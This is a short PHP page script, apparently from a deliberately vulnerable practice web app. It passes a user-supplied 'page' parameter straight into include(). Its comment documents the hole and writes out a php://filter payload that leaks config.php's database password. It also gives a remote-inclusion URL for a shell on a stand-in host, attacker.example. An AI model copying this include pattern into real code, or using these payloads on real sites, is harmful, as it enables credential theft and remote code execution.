<?php
require_once __DIR__ . '/includes/auth.php';
try_remember_me();

// VULN: classic Local/Remote File Inclusion — the "page" query param is
// concatenated straight into an include() path with just ".php" appended,
// no allow-list, no basename()/realpath() containment check, and NO
// directory prefix (PHP resolves the relative path against the current
// working directory, which under Apache/mod_php is this script's directory).
//
// - Source disclosure via PHP filter wrapper (works even though ".php" gets
//   appended, because that's the point — it targets a real .php file):
//     ?page=php://filter/convert.base64-encode/resource=config
//   -> resolves to "php://filter/convert.base64-encode/resource=config.php",
//      dumps config.php's source (including the hardcoded DB password) as base64.
// - RFI, if `allow_url_include` were ever turned on: ?page=http://attacker.example/shell
// - Traversal to any other local .php file the webserver user can read.
$page = $_GET['page'] ?? 'pages/home';

include __DIR__ . '/includes/header.php';
include $page . '.php';
include __DIR__ . '/includes/footer.php';
